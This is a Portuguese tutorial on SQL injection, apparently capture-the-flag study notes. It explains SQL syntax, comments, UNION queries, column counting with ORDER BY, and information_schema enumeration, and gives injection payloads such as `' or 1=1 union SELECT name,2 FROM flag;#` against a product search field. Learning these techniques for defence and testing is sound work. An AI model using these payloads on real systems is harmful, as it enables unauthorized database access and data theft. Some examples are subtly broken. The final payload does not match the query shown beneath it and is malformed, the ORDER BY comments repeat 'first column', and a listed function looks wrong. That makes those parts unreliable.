Se trata da utilização de um dado submetido pelo usuário sem o devido tratamento. Possibilitando assim a injeção de comandos no banco de dados tanto SQL quanto NoSQL.

## Comandos

### CRUD
Existem vários comandos no SQL mas os mais comuns são os chamados CRUD (CREATE, READ, UPDATE, DELETE) representados pelos comandos:

- **``INSERT``** - Insere registros no banco de dados.
- **``SELECT``** - Retorna informações do banco de dados.
- **``UPDATE``** - Atualiza os registros no banco de dados.
- **``DELETE``** - Deleta os registros do banco de dados.

``INSERT INTO <table_name> (<column>, <column>) VALUES (>value>, <value>);``

`SELECT <column>,<column> FROM <table_name>`;

`UPDATE <table_name> SET <column> = <value> WHERE <key_name> = <key_name>;`

`DELETE FROM <table_name> WHERE <key_name> = <key_name>;`
#### Exemplos
```sql
INSERT INTO users(name,password) VALUES ("Nycolas","n!c0l4s");

SELECT name,password FROM users WHERE name = "Nycolas";

UPDATE users SET name = "Nycolas Ramos" WHERE name = "Nycolas";

DELETE FROM user WHERE name = "Atylas";
```

### Comentários
Podemos comentar tanto somente uma linha quanto um bloco de código.

- **`--`** : Comenta uma linha de código.
- `#` : Comenta uma linha de código.
- `/* */` : Comenta um bloco de código.

#### Comentários
```sql
-- INSERT INTO users(name,password) VALUES ("Nycolas","n!c0l4s");

# SELECT name,password FROM users WHERE name = "Nycolas";

/*UPDATE users SET name = "Nycolas Ramos" WHERE name = "Nycolas";

DELETE FROM user WHERE name = "Atylas";
*/

SELECT name,password FROM users WHERE name = "Nycolas";
```

## UNION
Podemos unir querys com o union.

```sql
SELECT name,password FROM users union select name FROM flag;
```
Aqui além de trazer os campos `name` e `password` da tabela `users` ele irá trazer o campo `name` da tabela `flag`. Ao fazer a união, é interessante que retornemos a mesma quantidade de campos dos dois lados.

Para realizar isso, podemos colocar valores como números para serem retornados.
```sql
SELECT name,password FROM users union select name,1 FROM flag;
```

## Injection

### ORDER BY
É importante sabermos quantos campos tem a nossa tabela, podemos descobrir isso com a ordenação.

Com esse método vamos por acerto e erro. Vamos ordenando at achar um número que não nos retorna os registros´, então encontramos o limite da tabela.
#### Código
```sql
SELECT name, description FROM products ORDER BY 1;
-- Aqui ordenamos pela primeira coluna;

SELECT name, description FROM products ORDER BY 2;
-- Aqui ordenamos pela primeira coluna;

SELECT name, description FROM products ORDER BY 3;
-- Aqui ordenamos pela primeira coluna;
```

### Prática
Digamos que temos um input de pesquisa  de produtos que realiza a seguinte querie : 

```sql
SELECT name,description FROM products WHERE name LIKE '%<USER INPUT>%';
```

Caso não haja o tratamento adequado do input podemos fechar essa condição e inserir uma nova e alterar as queries : 

**Input normal**
<input style="width:100%;padding:5px;font-size:18pt;" value="notebook">
```sql
SELECT name,description FROM products WHERE name LIKE '%notebook%';
```

**SQL INJECTION**
<input style="width:100%;padding:5px;font-size:18pt;" value="não existe' or 1=1 # ">
```sql
SELECT name,description FROM products WHERE name LIKE '%não existe' or 1=1 # %';
```
Com essa querie retornamos todos os itens do banco de dados;

**SQL INJECTION**
<input style="width:100%;padding:5px;font-size:18pt;" value="' or 1=1 union SELECT name,2 FROM flag;# ">
```sql
SELECT name,description FROM products WHERE name LIKE '' or 1=1 union SELECT name,2 FROM flag;# ';
```
Aqui conseguimos retornar o campo nome da tabela flag;

### Informações
Podemos obter algumas informações do próprio banco de dados com algumas funções;

- **`database()`** - Retorna a database atual;
- **`username()`** - Retorna o usuário da conexão do banco de dados.
- **`@@version`** - Retorna a versão do banco de dados;

### Nome das tabelas
Podemos descobrir o nome das tabelas dos bancos;

```sql
SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema = 'cyber';
```
Assim conseguimos retornar o nome de todas as tabelas do banco de dados `cyber`.

```sql
SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE table_name = 'flag';
```
Assim retornamos o nome de todas as colunas da tabela ``flag``.

**SQL INJECTION**
<input style="width:100%;padding:5px;font-size:18pt;" value="' or 1=1 union SELECT information_schema.COLUMNS,2 WHERE table_name = 'flag';# ">

```sql
SELECT name,description FROM products WHERE name LIKE '' or 1=1 union SELECT COLUMN_NAME,2 FROM flag;# ';
```
